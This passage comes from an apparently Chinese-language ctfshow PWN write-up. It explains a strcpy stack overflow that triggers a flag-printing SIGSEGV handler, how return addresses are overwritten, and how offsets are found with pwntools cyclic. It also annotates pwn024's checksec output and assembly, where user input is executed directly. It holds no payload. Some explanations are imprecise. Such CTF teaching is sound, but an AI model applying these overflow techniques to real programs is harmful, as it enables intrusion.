"r"); // 打开名为"/ctfshow_flag"的文件进行读取  if ( !stream ) // 如果无法打开文件  {    puts("/ctfshow_flag: No such file or directory."); // 输出错误信息    exit(0); // 退出程序  }  fgets(flag, 64, stream); // 从上述文件中读取64个字符并存储在flag中  signal(11, (__sighandler_t)sigsegv_handler); // 设置SIGSEGV信号的处理函数为sigsegv_handler  v3 = getegid(); // 获取有效的组ID  setresgid(v3, v3, v3, v5, v6, v7, v3); // 更改真实、有效和保存的组ID  puts(asc_8048940); // 输出某个字符串  puts(asc_80489B4); // 输出某个字符串  puts(asc_8048A30); // 输出某个字符串  puts(asc_8048ABC); // 输出某个字符串  puts(asc_8048B4C); // 输出某个字符串  puts(asc_8048BD0); // 输出某个字符串  puts(asc_8048C64); // 输出某个字符串  puts("    * *************************************                           "); // 输出某个字符串  puts(aClassifyCtfsho); // 输出某个字符串  puts("    * Type  : Linux_Security_Mechanisms                               "); // 输出某个字符串  puts("    * Site  : https://ctf.show/                                       "); // 输出某个字符串  puts("    * Hint  : No canary found                                         "); // 输出某个字符串  puts("    * *************************************                           "); // 输出某个字符串  puts("How to input ?"); // 输出某个字符串  if ( argc &gt; 1 ) // 如果命令行参数的数量大于1    ctfshow((char *)argv[1]); // 调用ctfshow函数处理第二个命令行参数  return 0; // 返回0，表示程序执行成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="1-signal函数"><a href="#1-signal函数" class="headerlink" title="1.signal函数"></a>1.signal函数</h5><p><code>signal</code>是一个C语言的库函数，其作用是设置处理特定信号的函数。<code>signal</code>函数的原型如下：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void (*signal(int signum, void (*handler)(int)))(int);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个函数接受两个参数：一个是信号的编号，另一个是一个函数指针，指向处理该信号的函数。当程序收到指定的信号时，它就会调用指定的函数。</p><p>在你提供的代码中，<code>signal(11, (__sighandler_t)sigsegv_handler);</code>这一行是在设置当程序收到编号为11的信号时应该调用的函数。在Unix和Linux系统中，信号编号11通常是<code>SIGSEGV</code>，代表”segmentation violation”，也就是我们常说的”分段错误”。分段错误通常是由于程序试图访问它没有权限访问的内存区域引起的。</p><p><code>(__sighandler_t)sigsegv_handler</code>是一个函数指针，指向处理<code>SIGSEGV</code>信号的函数。在这个代码中，<code>sigsegv_handler</code>是一个已经定义好的函数，它会在接收到<code>SIGSEGV</code>信号时被调用。</p><p>所以，<code>signal(11, (__sighandler_t)sigsegv_handler);</code>这一行的意思就是：“当程序试图访问非法内存并触发<code>SIGSEGV</code>信号时，就调用<code>sigsegv_handler</code>函数进行处理。”这也是为什么这个程序可以通过缓冲区溢出来触发<code>SIGSEGV</code>并执行<code>sigsegv_handler</code>，从而利用这个漏洞来达到目的的原因。</p><h5 id="2-sighandler-函数"><a href="#2-sighandler-函数" class="headerlink" title="2. __sighandler_函数"></a>2. __sighandler_函数</h5><p><code>(__sighandler_t)</code>是一个函数指针类型，用于UNIX和Linux系统中的信号处理。它的定义通常在<code>&lt;signal.h&gt;</code>头文件中，该类型的函数接受一个整数参数（代表信号编号）并无返回值。</p><p>在代码<code>signal(11, (__sighandler_t)sigsegv_handler);</code>中，<code>(__sighandler_t)</code>实际上是一个强制类型转换，它将<code>sigsegv_handler</code>函数转换为一个<code>__sighandler_t</code>类型的函数指针，以满足<code>signal</code>函数的参数要求。此处需要注意的是，根据你之前提供的<code>sigsegv_handler</code>函数的定义，它不接受任何参数并且没有返回值，这与<code>__sighandler_t</code>类型的要求是一致的。</p><p>所以，当我们在<code>signal</code>函数调用中看到<code>(__sighandler_t)sigsegv_handler</code>时，这意味着<code>sigsegv_handler</code>函数被当作一个信号处理函数来使用，它将在收到相应的信号时被调用。</p><p>总结一下，<code>(__sighandler_t)</code>是一个类型，用于定义处理信号的函数的函数指针。而在<code>signal</code>函数中，我们需要将我们的处理函数转换为这个类型，以便于系统在接收到相应的信号时调用它。</p><h5 id="3-signal-11-sighandler-t-sigsegv-handler"><a href="#3-signal-11-sighandler-t-sigsegv-handler" class="headerlink" title="3. signal(11, (__sighandler_t)sigsegv_handler)"></a>3. signal(11, (__sighandler_t)sigsegv_handler)</h5><p>在这个程序中，<code>signal</code>函数被用来设置当接收到<code>SIGSEGV</code>信号（即分段错误，通常由于非法内存访问导致）时的处理函数为<code>sigsegv_handler</code>。分段错误通常会导致程序终止，但在这个程序中，它被特别处理了。</p><p>当发生缓冲区溢出时，可能会覆盖掉程序的其他内存区域，包括栈、堆、数据段或者代码段。如果能够成功地控制这种溢出，我们可能就可以利用这个<code>signal</code>函数的设置来执行任意代码。</p><p>具体来说，当缓冲区溢出发生在<code>ctfshow</code>函数中时，如果我们能够精心地控制输入字符串，可能可以修改返回地址或者其他重要的数据，导致程序执行我们想要的代码。当然，我们的代码可能尝试访问非法内存，这将会触发<code>SIGSEGV</code>信号。然而，由于<code>signal</code>的设置，<code>SIGSEGV</code>并不会使得程序终止，而是转向执行<code>sigsegv_handler</code>。如果我们能够控制<code>sigsegv_handler</code>函数的行为，我们就可以最终利用这个溢出漏洞来执行任意代码。</p><p>需要注意的是，实际上进行这样的攻击需要很高的技术能力，包括但不限于深入理解程序的内存布局、栈的工作原理，以及具体的机器代码等等。另外，现代操作系统通常会有各种安全机制（比如地址空间布局随机化、堆栈保护等等）来防止这样的攻击，所以在实践中，进行这样的攻击并不容易。</p><h4 id="（二）sigsegv-handler函数"><a href="#（二）sigsegv-handler函数" class="headerlink" title="（二）sigsegv_handler函数"></a>（二）sigsegv_handler函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">void __noreturn sigsegv_handler(){  fprintf(stderr, "%s\n", flag); // 向标准错误流stderr打印flag字符串  fflush(stderr); // 刷新stderr，确保flag被输出  exit(1); // 以退出码1结束程序}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（三）ctfshow函数"><a href="#（三）ctfshow函数" class="headerlink" title="（三）ctfshow函数"></a>（三）ctfshow函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">char *__cdecl ctfshow(char *src){  char dest[58]; //[esp+Ah] [ebp-3Eh] BYREF    // 定义一个大小为58的字符数组dest  return strcpy(dest, src); // 将src复制到dest并返回dest  // 注意：此处存在潜在的缓冲区溢出风险，如果src的长度超过58，会导致缓冲区溢出}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-栈溢出-覆盖地址"><a href="#1-栈溢出-覆盖地址" class="headerlink" title="1.栈溢出(覆盖地址)"></a>1.栈溢出(覆盖地址)</h4><p>**覆盖函数地址:**在这段代码中的注释<code>[esp+Ah] [ebp-3Eh] BYREF</code>是一个常见的反汇编注释格式，用于表示变量在函数栈帧中的相对位置。</p><p><code>esp</code>和<code>ebp</code>都是x86架构中的寄存器。<code>esp</code>（Stack Pointer）指向栈顶，<code>ebp</code>（Base Pointer）指向当前函数的栈底（也就是栈帧的基地址）。这两个寄存器在函数调用时被用来管理函数的栈空间。</p><p><code>[esp+Ah]</code>和<code>[ebp-3Eh]</code>都是表示相对于<code>esp</code>和<code>ebp</code>的偏移。<code>Ah</code>和<code>3Eh</code>都是十六进制的数，分别表示10和62。</p><p>这意味着<code>dest</code>数组位于<code>ebp</code>向上（地址减小的方向）偏移62字节的位置，或者<code>esp</code>向下（地址增大的方向）偏移10字节的位置。通常，我们选择使用<code>ebp</code>的相对位置，因为在函数内部，<code>esp</code>的值可能会因为局部变量的分配和释放而发生变化，而<code>ebp</code>在整个函数内部都保持不变。</p><p>所以，我们选择了<code>3Eh</code>，即62，作为<code>dest</code>数组的大小，因为在这个函数的栈帧中，<code>dest</code>的位置是从<code>ebp</code>向上偏移62字节的地方。当我们需要覆盖到<code>dest</code>之后的内存时，我们需要写入至少62个字节，然后再写入额外的字节以覆盖函数的返回地址或其他可能的数据。</p><p><strong>覆盖返回地址：</strong>在C语言中，当一个函数被调用时，CPU需要知道在哪里可以找到这个函数的代码，并且在函数结束后应该返回到哪里。为了实现这个目标，函数的返回地址会在函数被调用时被自动压入栈中。因此，当函数执行完成后，它可以通过弹出这个返回地址来找到应该返回的位置。</p><p>在32位的系统中，一个地址是32位（也就是4字节）的，因此函数的返回地址也是4字节的。这就是为什么我们在覆盖缓冲区时需要额外覆盖4个字节。</p><p>当我们控制了这4个字节，我们实际上可以控制函数返回时的跳转位置。这意味着，如果我们能够精心构造这4个字节，我们可以使程序跳转到任何我们想要的位置，例如一个包含恶意代码的内存段。</p><h4 id="2-cyclic生成覆盖地址序列（pwntools工具）"><a href="#2-cyclic生成覆盖地址序列（pwntools工具）" class="headerlink" title="2.cyclic生成覆盖地址序列（pwntools工具）"></a>2.cyclic生成覆盖地址序列（pwntools工具）</h4><p><code>cyclic</code>工具可以生成一个循环的、可预测的、不重复的字符串序列。这种序列通常用于确定缓冲区溢出时，溢出点的确切位置。</p><p><code>cyclic66</code>就是生成一个长度为66的这样的序列。</p><p>这样的序列有一个特性，那就是任何长度为4的子串在这个序列中都只出现一次。所以当你观察到程序崩溃，并且可以从崩溃处获取4个字节的信息时，你可以通过这4个字节在<code>cyclic</code>生成的序列中的位置，来确定溢出点的位置。</p><p>比如，你首先用<code>cyclic 200</code>生成一个200字节的序列，然后把它输入到你的程序中，导致程序崩溃。然后你从崩溃信息中获取到了一个4字节的值，你可以用<code>cyclic</code>库中的<code>cyclic_find</code>函数，通过这个4字节的值，来确定溢出点的位置。</p><h4 id="3-cdecl"><a href="#3-cdecl" class="headerlink" title="3.__cdecl"></a>3.__cdecl</h4><p><code>__cdecl</code> 是一个关于函数调用约定的修饰符，主要用于 C 和 C++ 中。它规定了函数参数的压栈顺序以及由谁来清理堆栈等规则。</p><p>在 <code>__cdecl</code> 的调用约定中，参数从右至左依次压入堆栈，也就是最右边的参数首先被压入堆栈。此外，调用方（也就是函数的调用者）负责清理堆栈，即回收堆栈空间。</p><p>这个调用约定主要在 x86 架构下的 Windows 和 Linux 编程中使用，而在其他一些系统或者体系结构中，这种调用约定可能会被忽略。</p><p>在代码中，<code>char *__cdecl ctfshow(char *src)</code> 表示 <code>ctfshow</code> 是一个函数，它的调用约定是 <code>__cdecl</code>，接受一个 <code>char *</code> 类型的参数 <code>src</code>，并返回一个 <code>char *</code> 类型的值。</p><h3 id="四、argc和argv"><a href="#四、argc和argv" class="headerlink" title="四、argc和argv"></a>四、argc和argv</h3><p><code>argc</code> 是一个在 C 语言和许多其他编程语言中使用的参数。它是 “argument count” 的缩写，代表传递给程序的命令行参数的数量。<code>argc</code> 是一个整数，至少为 1。当 <code>argc</code> 为 1 时，表示程序本身没有接收到任何额外的命令行参数，只有程序自身的名称。这个名称是存储在参数数组 <code>argv</code> 的第一个元素中（即 <code>argv[0]</code>）。</p><p>如果程序接收到了额外的命令行参数，这些参数会存储在 <code>argv</code> 数组的其余部分。例如，如果你在命令行中这样运行一个名为 <code>myProgram</code> 的程序：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">myProgram arg1 arg2 arg3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么 <code>argv</code> 数组就会包含以下的元素：</p><ul><li><code>argv[0]</code>：<code>"myProgram"</code></li><li><code>argv[1]</code>：<code>"arg1"</code></li><li><code>argv[2]</code>：<code>"arg2"</code></li><li><code>argv[3]</code>：<code>"arg3"</code></li></ul><p><code>argv</code> 数组总是以一个 <code>NULL</code> 指针作为结束标记，所以 <code>argv[argc]</code> 是 <code>NULL</code>。</p><p>在代码中，如果命令行参数的数量（由 <code>argc</code> 表示）大于 1，那么 <code>argv[1]</code> 就会被作为参数传递给 <code>ctfshow</code> 函数。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230719225615852.png" alt="image-20230719225615852"></p><h2 id="十二、pwn024"><a href="#十二、pwn024" class="headerlink" title="十二、pwn024"></a>十二、pwn024</h2><h3 id="checksec分析"><a href="#checksec分析" class="headerlink" title="checksec分析"></a>checksec分析</h3><ol><li><p><code>Arch: i386-32-little</code>：这个表示该程序是一个 32 位程序，使用的是小端字节序。</p></li><li><p><code>RELRO: Partial RELRO</code>：RELRO（Relocation Read-Only）是一种防止程序重定向动态链接函数和防止 GOT（全局偏移表）被覆写的安全策略。这里的 Partial RELRO 表示开启了部分 RELRO，GOT 表仍然可以被覆写。</p></li><li><p><code>Stack: No canary found</code>：这表示该程序没有启用栈保护（也就是没有堆栈 Canary），因此可能容易遭受到缓冲区溢出的攻击。</p></li><li><p><code>NX: NX disabled</code>：NX (Non-eXecutable)，也被称为 XN (eXecute Never)，是一种保护措施，它可以设定某些内存区域（比如栈和堆）为不可执行，从而防止恶意代码在这些区域执行。这里的 NX disabled 表示程序的栈和堆区域可执行，可能被用于执行 Shellcode。</p></li><li><p><code>PIE: No PIE (0x8048000)</code>：PIE (Position Independent Executable) 表示程序的执行文件可以在内存中任何位置执行，配合 ASLR (Address Space Layout Randomization)，可以提高安全性。这里的 No PIE 表示该程序未启用 PIE，内存布局相对固定，有可能被利用。</p></li><li><p><code>RWX: Has RWX segments</code>：这表示该程序有一些内存段同时具有读、写、执行权限，可能被用来插入和执行 Shellcode。</p></li></ol><p>根据以上分析，这个程序可能具有较多的安全漏洞，比如缓冲区溢出、GOT 覆写、可执行 Shellcode 等。在进行漏洞利用时，应考虑这些情况。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230726020658587.png" alt="image-20230726020658587"></p><h3 id="main汇编源代码"><a href="#main汇编源代码" class="headerlink" title="main汇编源代码"></a>main汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame fuzzy-sp; 这是一个基于基指针（bp）的栈帧，具有模糊的栈指针。; int __cdecl main(int argc, const char **argv, const char **envp); 这是一个名为 main 的函数，它采用 __cdecl 调用约定，输入参数是 argc, argv 和 envp。public main; 这将 main 函数标记为公开的，可以被其他模块调用。main proc near; 开始定义 main 函数。argc= dword ptr  8; 定义一个双字型指针 argc，位置在基指针(bp)向上偏移 8。argv= dword ptr  0Ch; 定义一个双字型指针 argv，位置在基指针(bp)向上偏移 0xC。envp= dword ptr  10h; 定义一个双字型指针 envp，位置在基指针(bp)向上偏移 0x10。lea     ecx, [esp+4]; 将 esp+4（也就是 argv 的地址）加载到 ecx 中。and     esp, 0FFFFFFF0h; 将 esp 和 0xFFFFFF0 进行按位与操作。这将使 esp 的值变为 16 的倍数，也就是按 16 字节对齐。push    dword ptr [ecx-4]; 将 [ecx-4]（也就是 argc）的值压入栈中。push    ebp; 将 ebp 的值压入栈中，保存旧的栈帧。mov     ebp, esp; 将 esp 的值赋给 ebp，创建新的栈帧。push    ebx; 将 ebx 的值压入栈中，以备后用。push    ecx; 将 ecx 的值压入栈中，以备后用。call    __x86_get_pc_thunk_bx; 获取当前的程序计数器 (pc)，并将其保存在 ebx 寄存器中。这是处理位置无关代码 (PIC) 的常见做法。add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $); 将全局偏移表 (_GLOBAL_OFFSET_TABLE_) 的地址添加到 ebx 中，从而 ebx 指向全局偏移表。mov     eax, ds:(stdin_ptr - 804A000h)[ebx]; 将 ds 段中的 stdin_ptr - 0x804A000 加到 ebx 上，并将结果保存在 eax 中。这是获取 stdin 的文件指针的方式。mov     eax, [eax]; 将 eax 指向的内存值（即 stdin 的文件指针）加载到 eax 中。push    0               ; n; 将 0 压入栈，这将被用作 setvbuf 函数的 n 参数。push    1               ; modes; 将 1 压入栈，这将被用作 setvbuf 函数的 modes 参数。push    0               ; buf; 将 0 压入栈，这将被用作 setvbuf 函数的 buf 参数。push    eax             ; stream; 将 eax（也就是 stdin 的文件指针）压入栈，这将被用作 setvbuf 函数的 stream 参数。call    _setvbuf; 调用 setvbuf 函数，设置 stdin 的缓冲区。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。mov     eax, ds:(stdout_ptr - 804A000h)[ebx]; 将 ds 段中的 stdout_ptr - 0x804A000 加到 ebx 上，并将结果保存在 eax 中。这是获取 stdout 的文件指针的方式。mov     eax, [eax]; 将 eax 指向的内存值（即 stdout 的文件指针）加载到 eax 中。push    0               ; n; 将 0 压入栈，这将被用作 setvbuf 函数的 n 参数。push    2               ; modes; 将 2 压入栈，这将被用作 setvbuf 函数的 modes 参数。push    0               ; buf; 将 0 压入栈，这将被用作 setvbuf 函数的 buf 参数。push    eax             ; stream; 将 eax（也就是 stdout 的文件指针）压入栈，这将被用作 setvbuf 函数的 stream 参数。call    _setvbuf; 调用 setvbuf 函数，设置 stdout 的缓冲区。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_80486E0 - 804A000h)[ebx] ; "    "; 将字符串 "    " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_8048754 - 804A000h)[ebx] ; "  "; 将字符串 "  " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "  " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "  "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_80487D0 - 804A000h)[ebx] ; " "; 将字符串 " " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 " " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 " "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_804885C - 804A000h)[ebx] ; " "; 将字符串 " " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 " " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 " "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_80488EC - 804A000h)[ebx] ; " "; 将字符串 " " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 " " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 " "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_8048970 - 804A000h)[ebx] ; "  "; 将字符串 "  " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "  " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "  "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_8048A04 - 804A000h)[ebx] ; "    "; 将字符串 "    " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_8048A80 - 804A000h)[ebx] ; "    * *********************************"; 将字符串 "    * *********************************" 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    * *********************************" 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    * *********************************".add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (aClassifyCtfsho - 804A000h)[ebx] ; "    * Classify: CTFshow --- PWN --- "; 将字符串 "    * Classify: CTFshow --- PWN --- " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    * Classify: CTFshow --- PWN --- " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    * Classify: CTFshow --- PWN --- "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (aTypeLinuxSecur - 804A000h)[ebx] ; "    * Type  : Linux_Security_Mechanisms"...; 将字符串 "    * Type  : Linux_Security_Mechanisms"... 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    * Type  : Linux_Security_Mechanisms"... 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    * Type  : Linux_Security_Mechanisms"...add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (aSiteHttpsCtfSh - 804A000h)[ebx] ; "    * Site  : https://ctf.show/        "...; 将字符串 "    * Site  : https://ctf.show/        "... 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    * Site  : https://ctf.show/        "... 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    * Site  : https://ctf.show/        "...add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (aHintNxDisabled - 804A000h)[ebx] ; "    * Hint  : NX disabled &amp; Has RWX seg"...; 将字符串 "    * Hint  : NX disabled &amp; Has RWX seg"... 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    * Hint  : NX disabled &amp; Has RWX seg"... 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    * Hint  : NX disabled &amp; Has RWX seg"...add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_8048A80 - 804A000h)[ebx] ; "    * *********************************"; 将字符串 "    * *********************************" 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    * *********************************" 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    * *********************************".add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。call    ctfshow; 调用 ctfshow 函数。mov     eax, 0; 将 eax 设置为 0。lea     esp, [ebp-8]; 将 esp 设置为 ebp - 8。pop     ecx; 从栈中弹出一个值到 ecx。pop     ebx; 从栈中弹出一个值到 ebx。pop     ebp; 从栈中弹出一个值到 ebp。lea     esp, [ecx-4]; 将 esp 设置为 ecx - 4。retn; 返回到调用者。; } // starts at 8048514main endp; 结束 main 函数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ctfshow汇编源代码"><a href="#ctfshow汇编源代码" class="headerlink" title="ctfshow汇编源代码"></a>ctfshow汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame; 这个函数使用基于基指针 (bp) 的栈帧; int __cdecl ctfshow(_DWORD); 这是一个名为 ctfshow 的函数，它采用了 __cdecl 调用约定，输入是一个无符号的 32 位整数。public ctfshow; 这将 ctfshow 函数标记为公开的，这意味着其他模块可以调用它。ctfshow proc near; 开始定义 ctfshow 函数。buf= byte ptr -88h; 定义一个字节型指针 buf，位置在基指针(bp)向下偏移 0x88。var_4= dword ptr -4; 定义一个双字型指针 var_4，位置在基指针(bp)向下偏移 4。push    ebp; 将基指针 (ebp) 压入栈中，保存老的栈帧。mov     ebp, esp; 将当前的栈顶 (esp) 设置为新的栈帧基指针 (ebp)。push    ebx; 将 ebx 寄存器的值压入栈中，以备后用。sub     esp, 84h; 在栈顶 (esp) 向下偏移 0x84，以预留空间。call    __x86_get_pc_thunk_bx; 获取当前的程序计数器 (pc)，并将其保存在 ebx 寄存器中。通常用于处理位置无关代码 (PIC)。add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $); 将全局偏移表 (_GLOBAL_OFFSET_TABLE_) 的地址添加到 ebx 中，从而 ebx 指向全局偏移表。sub     esp, 4; 在栈顶 (esp) 向下偏移 4，以预留空间。push    100h            ; nbytes; 将 0x100 (256) 压入栈，这将被用作 read 函数的 nbytes 参数。lea     eax, [ebp+buf]; 将 ebp + buf (也就是 buf 的地址) 加载到 eax 中，这将被用作 read 函数的 buf 参数。push    eax             ; buf; 将 buf 的地址压入栈。push    0               ; fd; 将文件描述符 0 (标准输入) 压入栈，这将被用作 read 函数的 fd 参数。call    _read; 调用 read 函数，从标准输入读取数据到 buf 中。add     esp, 10h; 将栈顶 (esp) 向上偏移 0x10，用以清理栈。sub     esp, 0Ch; 将栈顶 (esp) 向下偏移 0xC，以预留空间。lea     eax, [ebp+buf]; 将 ebp + buf (也就是 buf 的地址) 加载到 eax 中，这将被用作 puts 函数的 s 参数。push    eax             ; s; 将 s 的地址压入栈。call    _puts; 调用 puts 函数，将 buf 的内容输出。add     esp, 10h; 将栈顶 (esp) 向上偏移 0x10，用以清理栈。lea     eax, [ebp+buf]; 将 ebp + buf (也就是 buf 的地址) 加载到 eax 中。call    eax; 调用 eax 指向的函数，也就是 buf 中的代码。这可能会引发缓冲区溢出。nop; 无操作。mov     ebx, [ebp+var_4]; 从内存中读取 [ebp+var_4] 的值到 ebx 寄存器。leave; 恢复上一个栈帧，等价于 "mov esp, ebp; pop ebp"。retn; 从函数返回。ctfshow endp; 结束 ctfshow 函数的定义。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>函数开始时进行一些栈操作，保存寄存器的值。</p></li><li><p>调用 __x86_get_pc_thunk_bx 函数，获取当前的指令位置并存储在 ebx 寄存器中。</p></li><li><p>分配 0x84 字节的空间用于缓冲区，存储用户输入的数据。</p></li><li><p>调用 read 函数，从标准输入读取数据，并存储到缓冲区。</p></li><li><p>调用 puts 函数，将缓冲区的内容打印到标准输出。</p></li><li><p>通过调用 call eax 指令，以 eax 